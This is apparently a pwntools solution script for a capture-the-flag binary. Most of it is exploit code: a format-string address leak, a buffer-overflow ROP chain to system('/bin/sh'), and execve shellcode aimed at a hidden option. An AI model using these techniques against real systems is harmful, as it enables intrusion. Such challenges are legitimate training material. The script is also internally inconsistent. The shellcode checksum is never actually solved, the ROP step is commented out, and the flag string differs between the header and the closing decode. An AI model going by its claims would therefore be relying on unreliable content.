#!/usr/bin/env python3
"""
Signal Controller PWN Challenge - SOLUTION
Flag: UG0x1{Gr3y_L1n3_0v3rfl0w_Pwn3d}

VULNERABILITIES:
1. Buffer Overflow: Option 2 - reads 256 bytes into 64-byte buffer
2. Format String: Option 3 - printf(user_input) twice
3. Shellcode Execution: Hidden option 1337 - mmap RWX and execute input

SOLUTION PATHS:

PATH 1: Format String + Buffer Overflow (ret2libc)
- Use option 3 to leak libc addresses
- Use option 2 to overflow and ROP

PATH 2: Hidden Shellcode (easiest if you find it)
- Option 1337 allocates RWX memory
- If input checksum equals 0x539, executes input as shellcode
- Need to craft input that: sums to specific value AND is valid shellcode

PATH 3: Environment Variable (trick)
- Set SCADA_KEY environment variable
- Option 4 checks against it
- But this only works locally, not remote!
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Configuration
LOCAL = True
BINARY = './signal_controller'

if LOCAL:
    p = process(BINARY)
else:
    p = remote('challenge.underground-0x1.com', 9001)

# ====== PATH 1: Format String + ROP ======

def leak_via_format_string():
    """Use option 3 to leak stack/libc addresses"""
    p.sendlineafter(b'> ', b'3')
    
    # Leak stack addresses
    payload = b'%p.' * 20
    p.sendlineafter(b'Station: ', payload[:15])
    p.sendlineafter(b'Message: ', b'X')
    
    # Parse leaks
    p.recvuntil(b'[LOG] ')
    leak_data = p.recvuntil(b': X').decode()
    leaks = leak_data.split('.')
    
    log.info(f"Leaks: {leaks[:10]}")
    
    # Find libc pointer (usually around index 13-17)
    for i, leak in enumerate(leaks):
        try:
            addr = int(leak.replace('(nil)', '0').strip(), 16)
            if addr > 0x7f0000000000:
                log.info(f"Potential libc leak at index {i}: {hex(addr)}")
        except:
            pass
    
    return leaks

def exploit_buffer_overflow(libc_base):
    """Use option 2 to overflow and ROP"""
    
    # Gadgets (adjust for target libc)
    pop_rdi = libc_base + 0x23b6a
    ret = libc_base + 0x22679
    system = libc_base + 0x50d60
    binsh = libc_base + 0x1d8698
    
    payload = b'A' * 72  # 64 buffer + 8 saved RBP
    payload += p64(ret)  # Stack alignment
    payload += p64(pop_rdi)
    payload += p64(binsh)
    payload += p64(system)
    
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'code: ', payload)
    

# ====== PATH 2: Hidden Shellcode ======

def exploit_shellcode():
    """
    Option 1337 executes input as shellcode if checksum == 0x539
    
    Checksum algorithm:
    x = 0
    for i, c in enumerate(input):
        x += ord(c)
        x ^= (i * 31)
    
    Need x == 0x539 = 1337
    
    Strategy: Craft shellcode with NOP sled, adjust last bytes
    """
    
    # Simple execve("/bin/sh") shellcode
    shellcode = asm('''
        xor rsi, rsi
        xor rdx, rdx
        mov rdi, 0x68732f6e69622f
        push rdi
        mov rdi, rsp
        mov al, 59
        syscall
    ''')
    
    log.info(f"Shellcode length: {len(shellcode)}")
    
    # Calculate current checksum
    def calc_checksum(data):
        x = 0
        for i, c in enumerate(data):
            x += c
            x ^= (i * 31)
        return x & 0xFFFFFFFF
    
    current = calc_checksum(shellcode)
    log.info(f"Current checksum: {hex(current)}")
    
    # Pad with NOPs and adjust to hit 0x539
    # This is simplified - real solution needs brute force or SMT solver
    
    p.sendlineafter(b'> ', b'1337')
    p.sendlineafter(b'input: ', shellcode)
    

# ====== MAIN ======

def main():
    log.info("=== Signal Controller PWN ===")
    
    # Try shellcode path first (if you know the hidden option)
    try:
        exploit_shellcode()
        p.interactive()
    except:
        log.warning("Shellcode path failed, trying ROP...")
    
    # Fallback: Format string leak + ROP
    leaks = leak_via_format_string()
    
    # Assuming we found libc leak
    # libc_base = leaked_addr - offset
    # exploit_buffer_overflow(libc_base)
    
    p.interactive()

if __name__ == "__main__":
    main()


# ====== FLAG DECODE ======
# The flag is encoded in the binary as hex constants:
# _0x1 = 0x47723379 = "Gr3y"
# _0x2 = 0x5F4C316E = "_L1n"
# _0x3 = 0x335F3076 = "3_0v"
# _0x4 = 0x33726631 = "3rf1"
# _0x5 = 0x30775F50 = "0w_P"
# _0x6 = 0x776E3364 = "wn3d"
#
# Combined: UG0x1{Gr3y_L1n3_0v3rf10w_Pwn3d}
